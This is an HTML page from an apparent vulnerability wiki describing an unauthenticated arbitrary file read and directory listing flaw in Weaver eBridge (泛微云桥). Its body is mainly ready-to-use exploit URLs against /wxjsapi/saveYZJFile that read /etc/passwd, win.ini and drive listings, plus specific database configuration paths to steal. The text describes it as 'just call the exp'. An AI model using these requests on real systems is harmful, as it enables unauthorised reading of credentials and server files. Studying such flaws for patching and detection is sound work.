@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>泛微云桥任意文件读取 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6cdb\u5fae\u4e91\u6865\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6", url: "#_top", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%B5%8E%E5%8D%97%E4%B8%8A%E9%82%A6%E7%94%B5%E5%AD%90%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV6.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%B5%8E%E5%8D%97%E4%B8%8A%E9%82%A6%E7%94%B5%E5%AD%90%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV6.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-link">
+        电子文档安全管理系统 V6.0存在任意文件下载
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
+        泛微移动管理平台lang2sql接口任意文件上传
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">泛微云桥任意文件读取<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>1.未授权读取。直接调用exp就OK </p>
+<div class="highlight"><pre><span></span><code>http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt 
+
+http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt 
+</code></pre></div>
+<p>2.任意读取linux的passwd值</p>
+<p>可在响应包中JSON中包含ID的32位值</p>
+<p>再次请求可获得/etc/passwd值</p>
+<div class="highlight"><pre><span></span><code> http://www.xxx.com/FileNoLogin/32位MD5值 
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt
+</code></pre></div>
+<p><img alt="image-20201020131557916" src="../resource/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/image-20201020131557916.png" /></p>
+<p><img alt="image-20201020131608856" src="../resource/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/image-20201020131608856.png" /></p>
+<p><img alt="image-20201020131618615" src="../resource/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/image-20201020131618615.png" /></p>
+<p>3.任意读取winodws下的win.ini值 未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路</p>
+<p>径从而下载数据库配置文件危害可见。
+ 1.downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。 </p>
+<div class="highlight"><pre><span></span><code>http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///c://windows/win.ini&amp;fileExt=txt
+</code></pre></div>
+<p><img alt="image-20201020131651995" src="../resource/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/image-20201020131651995.png" /></p>
+<p>2.通过查看文件接口访问 /file/fileNoLogin/id</p>
+<p><img alt="image-20201020131709565" src="../resource/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/image-20201020131709565.png" /></p>
+<p>3.其他利用技巧(读取任意目录文件) 简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。 参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历” </p>
+<div class="highlight"><pre><span></span><code>/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///D:/&amp;fileExt=txt
+</code></pre></div>
+<p><img alt="image-20201020131743737" src="../resource/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/image-20201020131743737.png" /></p>
+<p>目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘 迅雷下载:</p>
+<p>d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库</p>
+<p><img alt="image-20201020131806330" src="../resource/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/image-20201020131806330.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%B5%8E%E5%8D%97%E4%B8%8A%E9%82%A6%E7%94%B5%E5%AD%90%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV6.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%B5%8E%E5%8D%97%E4%B8%8A%E9%82%A6%E7%94%B5%E5%AD%90%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FV6.0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-link">
+        电子文档安全管理系统 V6.0存在任意文件下载
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0lang2sql%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
+        泛微移动管理平台lang2sql接口任意文件上传
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
